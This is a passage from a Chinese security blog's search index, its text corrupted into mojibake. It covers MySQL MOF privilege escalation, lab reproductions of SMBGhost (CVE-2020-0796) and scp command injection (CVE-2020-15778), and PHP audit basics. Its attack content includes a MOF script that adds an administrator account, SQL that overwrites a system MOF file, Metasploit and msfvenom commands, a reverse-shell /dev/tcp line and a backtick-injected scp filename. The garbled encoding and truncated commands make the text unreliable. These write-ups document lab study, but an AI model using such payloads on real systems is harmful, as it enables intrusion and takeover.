¼å¼å…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚ å…¶å®å°±æ˜¯ç”¨äº†MySQLçš„rootæƒé™äº†ä»¥åï¼Œç„¶åä½¿ç”¨rootæƒé™å»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„MOFã€‚éš”äº†ä¸€å®šæ—¶é—´ä»¥åè¿™ä¸ªMOFå°±ä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªMOFå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œè¿™ä¸ªvbså¤§å¤šæ•°çš„æ˜¯cmdçš„æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ã€‚ MOFææƒè¿‡ç¨‹: å°†MOFä¸Šä¼ è‡³ä»»æ„å¯è¯»å¯å†™ç›®å½•ä¸‹ æ›´æ”¹MOFæ–‡ä»¶ä»£ç  #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter &#123; EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admin admin /add\\\")\"; &#125;; instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; ä½¿ç”¨SQLè¯­å¥å°†ç³»ç»Ÿå½“ä¸­é»˜è®¤çš„nullevt.mofç»™æ›¿æ¢æ‰ select load_file('D:\\wamp\\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; MSFè¿›è¡ŒMOFææƒ Msfä¸‹çš„exploit/windows/mysql/mysql_mofæ¨¡å—æä¾›äº†ç›´æ¥MOFææƒï¼Œä¸è¿‡è¯¥æ¼æ´æˆåŠŸè·Ÿæ“ä½œç³»ç»Ÿæƒé™å’ŒMySQLæ•°æ®åº“ç‰ˆæœ¬æœ‰å…³ï¼Œæ‰§è¡ŒæˆåŠŸåä¼šç›´æ¥åå¼¹shellåˆ°meterpreterã€‚ use exploit/windows/mysql/mysql_mof set rhost IP //è®¾ç½®éœ€è¦ææƒçš„è¿œç¨‹ä¸»æœºIPåœ°å€ set rport 3306 //è®¾ç½®mysqlçš„è¿œç¨‹ç«¯å£ set password root //è®¾ç½®mysqlæ•°æ®åº“rootå¯†ç  set username root //è®¾ç½®mysqlç”¨æˆ·å show options //æŸ¥çœ‹è®¾ç½® exploit MySQLå…è®¸è¿œç¨‹rootç™»å…¥ ä¸€: use mysql; update user set host = '%' where user = 'root'; FLUSH PRIVILEGES ; äºŒ: GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION; FLUSH PRIVILEGES; å¯åŠ¨é¡¹ææƒ å¯¼å‡ºè‡ªå®šä¹‰å¯æ‰§è¡Œæ–‡ä»¶åˆ°å¯åŠ¨ç›®å½•é…åˆé‡å¯æ‰§è¡Œ å°†åˆ›å»ºå¥½çš„åé—¨æˆ–æ‰§è¡Œæ–‡ä»¶è¿›è¡ŒæœåŠ¡å™¨å¯åŠ¨é¡¹å†™å…¥,é…åˆé‡å¯æ‰§è¡Œ MSFè¿›è¡Œå¯åŠ¨é¡¹ææƒ use exploit/windows/mysql/mysql_start_up set rhost IP //è®¾ç½®éœ€è¦ææƒçš„è¿œç¨‹ä¸»æœºIPåœ°å€ set rport 3306 //è®¾ç½®mysqlçš„è¿œç¨‹ç«¯å£ set password root //è®¾ç½®mysqlæ•°æ®åº“rootå¯†ç  set username root //è®¾ç½®mysqlç”¨æˆ·å show options //æŸ¥çœ‹è®¾ç½® exploit Windowsä¸‹ä¸‰ç§MySQLææƒå‰–æ MySQLæ•°æ®åº“æ¸—é€åŠæ¼æ´åˆ©ç”¨æ€»ç»“ mofææƒåŸç†åŠå…¶è¿‡ç¨‹","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"CVE-2020-0796ï¼ˆæ°¸æ’ä¹‹é»‘)æ¼æ´å¤ç°","slug":"CVE_2020_0796(æ°¸æ’ä¹‹é»‘)æ¼æ´å¤ç°","date":"2021-04-10T12:43:29.473Z","updated":"2021-04-11T06:34:10.184Z","comments":true,"path":"2021/04/10/CVE_2020_0796(æ°¸æ’ä¹‹é»‘)æ¼æ´å¤ç°/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-0796ï¼ˆæ°¸æ’ä¹‹é»‘)æ¼æ´åŸç† SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ SMB 3.1.1åè®®ä¸­å¤„ç†å‹ç¼©æ¶ˆæ¯æ—¶ï¼Œå¯¹å…¶ä¸­æ•°æ®æ²¡æœ‰ç»è¿‡å®‰å…¨æ£€æŸ¥ï¼Œç›´æ¥ä½¿ç”¨ä¼šå¼•å‘å†…å­˜ç ´åæ¼æ´ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´æ— éœ€æƒé™å³å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå—é»‘å®¢æ”»å‡»çš„ç›®æ ‡ç³»ç»Ÿåªéœ€è¦å¼€æœºåœ¨çº¿å°±æœ‰å¯èƒ½è¢«å…¥ä¾µ Windows 10å’ŒWindows Server 2016å¼•å…¥äº†SMB 3.1.1ï¼Œæœ¬æ¬¡æ¼æ´æºäºSMBv3æ²¡æœ‰æ­£ç¡®å¤„ç†å‹ç¼©çš„æ•°æ®åŒ…ï¼Œåœ¨è§£å‹æ•°æ®åŒ…çš„æ—¶å€™ä½¿ç”¨å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„é•¿åº¦è¿›è¡Œè§£å‹æ—¶ï¼Œå¹¶æ²¡æœ‰æ£€æŸ¥é•¿åº¦æ˜¯å¦åˆæ³•ï¼Œæœ€ç»ˆå¯¼è‡´æ•´æ•°æº¢å‡º åˆ©ç”¨è¯¥æ¼æ´ï¼Œé»‘å®¢å¯ç›´æ¥è¿œç¨‹æ”»å‡»SMBæœåŠ¡ç«¯è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ„å»ºæ¶æ„SMBæœåŠ¡ç«¯è¯±å¯¼å®¢æˆ·ç«¯è¿æ¥ä»è€Œå¤§è§„æ¨¡æ”»å‡»å®¢æˆ·ç«¯ å½±å“ç‰ˆæœ¬Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) æ¼æ´å¤ç°å·¥å…·ä¸‹è½½ æ¼æ´æ£€æµ‹å·¥å…·ï¼šhttp://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip æ”»å‡»pocï¼šhttps://github.com/eerykitty/CVE-2020-0796-PoC shellè„šæœ¬ï¼šhttps://github.com/chompie1337/SMBGhost_RCE_PoC è“å±å¤ç°ç¯å¢ƒ ç›®æ ‡æœºï¼šWindows 10 1903 ip: 10.7.1.111ï¼ˆè™šæ‹Ÿæœºï¼‰ æ”»å‡»æœºï¼šWindows 10 20H2 ip: 10.7.6.254ï¼ˆç‰©ç†æœºï¼‰ å°†ç›®æ ‡æœºçš„é˜²ç«å¢™å…³é—­ åœ¨æ”»å‡»æœºä¸Šå¯¹ç›®æ ‡æœºè¿›è¡Œæ£€æµ‹ï¼Œçœ‹å…¶æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚ åˆ©ç”¨ä¸‹è½½çš„pocè„šæœ¬å‘èµ·æ”»å‡» åå¼¹shellç¯å¢ƒ ç›®æ ‡æœºï¼šWindows 10 1903 ip: 10.7.1.111ï¼ˆè™šæ‹Ÿæœºï¼‰ æ”»å‡»æœºï¼šWindows 10 20H2 ip: 10.7.6.254ï¼ˆç‰©ç†æœºï¼‰ ç”Ÿæˆä¸€ä¸ªåå¼¹æœ¨é©¬ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\\x00' -i 1 -f python è¯´æ˜: #-p payload #-e ç¼–ç æ–¹å¼ #-i ç¼–ç æ¬¡æ•° #-b è¿‡æ»¤åå­—ç¬¦ #LHOST,LPORT ç›‘å¬ä¸Šçº¿çš„ä¸»æœºIPå’Œç«¯å£ #-f python ç”Ÿæˆpythonæ ¼å¼ #â€˜\\x00â€˜è½¬ä¹‰å­—ç¬¦ï¼Œå¯¹åº”ascallç ä¸­ä¸ºnullï¼Œå› ä¸ºæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æ‰€ä»¥ä¼šå‡ºç°ï¼Œåœ¨pythonä¸­ä½œä¸ºç»“æŸçš„æ ‡å¿—ï¼Œæœ‰ç‚¹ç›¸å½“äº%00æˆªæ–­çš„æ„Ÿè§‰ã€‚ ç”¨ç”Ÿæˆçš„shellcodeå°†shellè„šæœ¬å·¥å…·é‡Œé¢çš„exploit.pyä¸­çš„user_payloadæ›¿æ¢æ‰ã€‚ä¿ç•™å‰é¢çš„åå­—ï¼Œåªæ›¿æ¢å†…å®¹ å¼€å¯msfç›‘å¬æ¨¡å— è¿è¡Œexploit.pyè„šæœ¬ï¼Œå‘èµ·æ”»å‡»åå¼¹shell è¿™ä¸ªè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œè¦å¤šè¯•å‡ æ¬¡æ‰èƒ½å¾—åˆ°shellï¼Œä¸ç”¨ç€æ€¥ã€‚è¿™ä¸ªè„šæœ¬æœ‰æ—¶å€™ä¼šæŠŠé¶æœºæ‰“è“å±ï¼Œé‡å¯ä¸€ä¸‹é¶æœºå°±å¥½äº†ï¼Œç»§ç»­æ‰§è¡Œè„šæœ¬çŸ¥é“å¾—åˆ°shellã€‚","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"}]},{"title":"CVE-2020-15778 OpenSSLæ¼æ´å¤ç°","slug":"CVE-2020-15778(OpenSSL)æ¼æ´å¤ç°","date":"2021-04-10T12:40:24.207Z","updated":"2021-04-11T06:33:29.417Z","comments":true,"path":"2021/04/10/CVE-2020-15778(OpenSSL)æ¼æ´å¤ç°/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-15778 OpenSSLå½±å“ç‰ˆæœ¬ï¼š OpenSSH &lt;= 8.3p1 æ¼æ´ä»‹ç» æ¼æ´å…¬å¼€æŠ«éœ²2020å¹´7æœˆ18æ—¥ï¼Œopenssh 8.3p1çš„SCPå‘½ä»¤å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å±€é™æ€§ é€‚ç”¨èŒƒå›´å°ï¼Œéœ€è¦çŸ¥é“rootç”¨æˆ·å¯†ç ï¼Œæœ€å¤§æœ€ç”¨ä¸ºsshæ— æ³•è¿æ¥ï¼Œä½†scpå¯ä»¥ä½¿ç”¨æ—¶ ç¯å¢ƒæ­å»º ä½¿ç”¨iptablesç­–ç•¥æ­å»ºç¯å¢ƒï¼Œç¦ç”¨sshç™»å½•ï¼Œåªä¿ç•™scp(CentOS) å…³é—­è‡ªå¸¦é˜²ç«å¢™(firewalld) åœæ­¢firewalldæœåŠ¡ $ systemctl stop firewalld è®¾ç½®iptablesç­–ç•¥ service iptables start iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP service iptables save iptables -L -n --line-number éªŒè¯ scpåŠŸèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯sshåœ¨è¾“å…¥å¯†ç åï¼Œæ— ä»»ä½•å›å“ï¼Œæ— æ³•è¿æ¥ï¼Œè¯æ˜iptablesç­–ç•¥æˆåŠŸæœ‰æ•ˆã€‚ æ¼æ´å¤ç°åœ¨kalié‡Œé¢æ–°å»º1.shï¼Œå†™å…¥åå¼¹shellçš„bashå‘½ä»¤ bash -i >& /dev/tcp/10.7.5.120>&1 kaliç›‘å¬6666ç«¯å£ ä½¿ç”¨scpå‘½ä»¤ä¼ è¾“æ–‡ä»¶åˆ°CentOSçš„/tmpç›®å½• å‘½ä»¤æ‰§è¡Œï¼Œè¿è¡Œ1.sh scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`' æ¼æ´åˆ†æ scpå‘½ä»¤æºç  if (remin == -1) &#123; xasprintf(&bp, \"%s -t %s%s\", cmd, *targ == '-' ? \"-- \" : \"\", targ); if (do_cmd(thost, tuser, tport, bp, &remin, &remout) < 0) exit(1); if (response() < 0) exit(1); free(bp); &#125; å½“æ‰§è¡Œæœ¬åœ°scpå‘½ä»¤æ—¶ï¼Œscpä¸ä¼šæ£€æŸ¥ã€è¿‡æ»¤å’Œæ¸…é™¤æ–‡ä»¶åã€‚è¿™ä½¿å¾—æ”»å‡»è€…æ‰§è¡Œå¸¦æœ‰åå¼•å·çš„æœ‰æ•ˆscpå‘½ä»¤æ—¶ï¼Œæœ¬åœ°shellè¿˜å°†æ‰§è¡Œåå¼•å·ä¸­çš„å‘½ä»¤ã€‚ ä¿®å¤å»ºè®®è¡¥ä¸/å‡çº§","categories":[],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"PHPä»£ç å®¡è®¡åŸºç¡€æ¦‚å¿µ","slug":"ä»£ç å®¡è®¡æ¦‚è¿°","date":"2021-04-10T08:42:14.704Z","updated":"2021-04-11T06:32:36.874Z","comments":true,"path":"2021/04/10/ä»£ç å®¡è®¡æ¦‚è¿°/","link":"","permalink":"https://ms12020.github.io/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"PHPä»£ç å®¡è®¡å·¥å…·ä»£ç ç¼–è¾‘å™¨ Notepad++ Visual Studio Code ä»£ç å®¡è®¡å·¥å…· Seayæºä»£ç å®¡è®¡ç³»ç»Ÿ Firtufy SCA RIPS æ¼æ´éªŒè¯è¾…åŠ© BurpSuite Community æµè§ˆå™¨æ‰©å±• ç¼–ç è½¬æ¢ã€åŠ å¯†è§£å¯†å·¥å…· æ­£åˆ™è°ƒè¯•å·¥å…· SQLæ‰§è¡Œç›‘æ§å·¥å…· æ€è·¯ æ£€æŸ¥é“­æ„Ÿå‡½æ•°çš„å‚æ•°ï¼Œç„¶åå›æº¯å˜é‡ï¼Œåˆ¤æ–­å˜é‡æ˜¯å¦å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼ˆé€†å‘è¿½è¸ªï¼‰ æ‰¾å‡ºå“ªäº›æ–‡ä»¶åœ¨æ¥æ”¶å¤–éƒ¨ä¼ å…¥çš„å‚æ•°ï¼Œç„¶åè·Ÿè¸ªå˜é‡çš„ä¼ é€’è¿‡ç¨‹ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰å˜é‡ä¼ å…¥åˆ°é«˜å±å‡½æ•°ä¸­ï¼Œæˆ–è€…ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å¦æœ‰ä»£ç é€»è¾‘æ¼æ´ï¼ˆæ­£å‘è¿½è¸ªï¼‰ ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´ï¼Œæ ¹æ®è‡ªèº«çš„ç¦è¨€åˆ¤æ–­è¯¥ç±»åº”ç”¨é€šå¸¸åœ¨å“ªäº›åŠŸèƒ½ä¸­ä¼šå‡ºç°æ¼æ´ï¼Œç›´æ¥å…¨ç¯‡é˜…è¯»è¯¥åŠŸèƒ½ä»£ç  å­¦å¥½ä»£ç å®¡è®¡éœ€è¦æŒæ¡ä¸€ä¸‹å‡ ç‚¹ PHPç¼–ç¨‹è¯­è¨€çš„ç‰¹æ€§å’ŒåŸºç¡€ Webå‰ç«¯ç¼–ç¨‹åŸºç¡€ æ¼æ´å½¢æˆåŸç† ä»£ç å®¡è®¡æ€è·¯ ä¸åŒç³»ç»Ÿã€ä¸­é—´ä»¶ä¹‹é—´çš„ç‰¹æ€§å·®å¼‚ PHPæ ¸å¿ƒé…ç½®â€‹ å¸¸è§PHP_INI_*å¸¸é‡çš„å®šä¹‰ å¸¸é‡ å«ä¹‰ PHP_INI_USER è¯¥é…ç½®é€‰é¡¹å¯åœ¨ç”¨æˆ·çš„PHPè„šæœ¬æˆ–Windowsæ³¨å†Œè¡¨ä¸­è®¾ç½® PHP_INI_PERDIR è¯¥é…ç½®é€‰é¡¹å¯åœ¨php.iniã€.htaccessæˆ–httpd.confä¸­è®¾ç½® PHP_INI_SYSTEM è¯¥é…ç½®é€‰é¡¹å¯åœ¨php.iniæˆ–httpd.confä¸­é…ç½® PHP_INI_ALL è¯¥é…ç½®é€‰é¡¹å¯åœ¨ä»»ä½•åœ°æ–¹è®¾ç½® php.ini.only è¯¥é…ç½®é€‰é¡¹å¯ä»…å¯åœ¨php.iniä¸­é…ç½® å¸¸è§æ ¸å¿ƒé…ç½®register_globals(å…¨å±€å˜é‡æ³¨å†Œå¼€å…³) ç‰ˆæœ¬ï¼š&lt;= PHP 5.3.0 åœ¨é€‰é¡¹è®¾ç½®ä¸ºonçš„æƒ…å†µä¸‹ï¼Œä¼šç›´æ¥å§ç”¨æˆ·GETã€POSTç­‰æ–¹å¼æäº¤ä¸Šæ¥çš„å‚æ•°æ³¨å†Œæˆå…¨å±€å˜é‡å¹¶åˆå§‹åŒ–å€¼ä¸ºå‚æ•°å¯¹åº”çš„å€¼ï¼Œä½¿å¾—æäº¤çš„å‚æ•°å¯ä»¥ç›´æ¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨ allow_url_include(æ˜¯å¦å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶) ç‰ˆæœ¬ï¼šPHP all PHP 5.2.0ä¹‹åé»˜è®¤ä¸ºOff ç±»ä¼¼å‡½æ•°ï¼šallow_url_fopen(æ˜¯å¦æ‰“å¼€è¿œç¨‹æ–‡ä»¶) åœ¨è¯¥é…ç½®ä¸ºonçš„æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥ç›´æ¥è¿œç¨‹åŒ…å«æ–‡ä»¶ï¼Œå½“å­˜åœ¨include($var)å¹¶ä¸”$varå¯æ§çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥æ§åˆ¶å…¶æ¥æ‰§è¡ŒPHPä»£ç  magic_quotes_gpc(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤) ç‰ˆæœ¬ï¼š&lt; PHP 5.4ï¼› PHP 5.3ä¹‹åä¸æ¨èä½¿ç”¨è¯¥å‡½æ•° ç½®è¿”å›ï¼š &lt; PHP 4.2.3é…ç½®èŒƒå›´ä¸ºPHP_INI_ALLï¼›&gt; PHP 4.2.3é…ç½®èŒƒå›´ä¸ºPHP_INI_PERDIR å½“é€‰é¡¹ä¸ºOnæ—¶ï¼Œåœ¨ä¸å­˜åœ¨ç¼–ç æˆ–è€…å…¶ä»–ç»•è¿‡ç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿å¾—å¾ˆå¤šæ¼æ´æ— æ³•åˆ©ç”¨ï¼Œä»–ä¼šè‡ªåŠ¨åœ¨GETã€POSTã€COOKIEå˜é‡ä¸­çš„å•å¼•å·&#39;&#39;ã€åŒå¼•å·&quot;&quot;ã€åæ–œæ \\ä»¥åŠç©ºå­—ç¬¦NULLçš„å‰é¢åŠ ä¸Šåæ–œæ  åœ¨PHP5ä¸­magic_quotes_gpcä¸ä¼šè¿‡æ»¤$_SERVERå˜é‡ï¼Œå¯¼è‡´å¾ˆå¤šclient-ipã€refererä¸€ç±»çš„æ¼æ´èƒ½å¤Ÿåˆ©ç”¨ã€‚ open_basedir(PHPå¯è®¿é—®ç›®å½•) ç‰ˆæœ¬ï¼šPHP ALL èŒƒå›´ï¼š&lt; PHP 5.2.3é…ç½®èŒƒå›´ä¸ºPHP_INI_SYSTEMï¼›&gt; PHP 5.2.3é…ç½®èŒƒå›´PHP_INI_ALL open_basediræŒ‡ä»¤ç”¨æ¥é™åˆ¶PHPåªèƒ½è®¿é—®å“ªäº›ç›®å½•ï¼Œé€šå¸¸åªéœ€è¦è®¾ç½®Webæ–‡ä»¶ç›®å½•å³å¯ï¼Œå¦‚æœéœ€è¦åŠ è½½å…¶ä»–å¤–éƒ¨è„šæœ¬ï¼Œä¹Ÿéœ€è¦å§è„šæœ¬æ‰€åœ¨çš„ç›®å½•è·¯å¾„åŠ å…¥åˆ°open_basediræŒ‡ä»¤ä¸­ï¼Œå¤šä¸ªç›®å½•ç”¨åˆ†å·(;)åˆ†éš” # `open_basedir`æŒ‡å®šçš„å®é™…ä¸Šæ—¶å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å open_basedir=/www/a # è®¾å®šå¯è®¿é—®çš„ç›®å½•ä¸º/wwwä¸‹ä»¥aå¼€å¤´çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´/www/aå’Œ/www/abéƒ½å¯ä»¥è¢«è®¿é—® open_basedir=/www/a/ # è®¾ç½®åªèƒ½è®¿é—®/www/aæ–‡ä»¶ å½“open_basediré…ç½®ç›®å½•åï¼Œæ‰§è¡Œè„šæœ¬è®¿é—®å…¶ä»–å‡½æ•°éƒ½éœ€è¦éªŒè¯æ–‡ä»¶æ˜¯å¦ç¬¦åˆé…ç½®è¦æ±‚ï¼Œå› æ­¤ä¼šå½±å“æ•ˆç‡ disable_functions(ç¦ç”¨å‡½æ•°) ç‰ˆæœ¬ï¼šPHP ALL èŒƒå›´ï¼šè¯¥æŒ‡ä»¤çš„é…ç½®èŒƒå›´ä¸ºphp.ini only åœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä¸ºäº†æ›´å®‰å…¨åœ°å…è®¸PHPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨disable_functionsæŒ‡ä»¤æ¥ç¦æ­¢ä¸€äº›æ•æ„Ÿå‡½æ•°çš„ä½¿ç”¨ã€‚å½“ä½ ä½¿ç”¨è¯¥æŒ‡ä»¤ç¦ç”¨å±é™©å‡½æ•°æ—¶ï¼Œåˆ‡è®°å°†dl()å‡½æ•°åŠ åˆ°ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥åˆ©ç”¨dl()å‡½æ•°æ¥åŠ è½½è‡ªå®šä¹‰çš„PHPæ‰©å±•ä»¥çªç ´disable_functionsçš„é™å®š # å¤šä¸ªå‡½æ•°ä¹‹é—´ç”¨é€—å·ï¼ˆ,ï¼‰åˆ†éš” disable_functions=phpinfo,eval,passthru,exec,system,dl disable_errorså’Œerror_reporting(é”™è¯¯æ˜¾ç¤º) ç‰ˆæœ¬ï¼šPHP ALL é…ç½®èŒƒå›´ï¼šPHP_INI_ALL disable_errorsè¡¨æ˜æ˜¯å¦æ˜¾ç¤ºPHPè„šæœ¬å†…éƒ¨çš„é”™è¯¯ï¼Œåœ¨è°ƒè¯•æ—¶é€šå¸¸å°†PHPé”™è¯¯æ˜¾ç¤ºæ‰“å¼€ï¼Œä½†æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå»ºè®®å…³é—­PHPé”™è¯¯å›æ˜¾ã€‚ ä¸ºäº†é¿å…ä¸€äº›å®‰å…¨éšæ‚£ï¼Œåœ¨è®¾ç½®disable_errors=Onæ—¶ï¼Œè¿˜å¯ä»¥é…ç½®error_reportingï¼Œè¿™ä¸ªé€‰é¡¹ç”¨æ¥é…ç½®é”™è¯¯æ˜¾ç¤ºçš„çº§åˆ«ï¼Œå¯ä½¿ç”¨æ•°å­—ä¹Ÿå¯ä½¿ç”¨å†…ç½®å¸¸é‡é…ç½®ã€‚ â€‹ æ•°å­—æ ¼å¼ä¸å˜é‡æ ¼å¼çš„è¯¦ç»†ä¿¡æ¯ â€‹ å¸¸ç”¨æŒ‡ä»¤åŠè¯´æ˜","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}],"categories":[],"tags":[{"name":"åŸç†","slug":"åŸç†","permalink":"https://ms12020.github.io/tags/%E5%8E%9F%E7%90%86/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://ms12020.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"Web","slug":"Web","permalink":"https://ms12020.github.io/tags/Web/"},{"name":"LNK","slug":"LNK","permalink":"https://ms12020.github.io/tags/LNK/"},{"name":"ç¼“å†²åŒºæº¢å‡º","slug":"ç¼“å†²åŒºæº¢å‡º","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"},{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"},{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}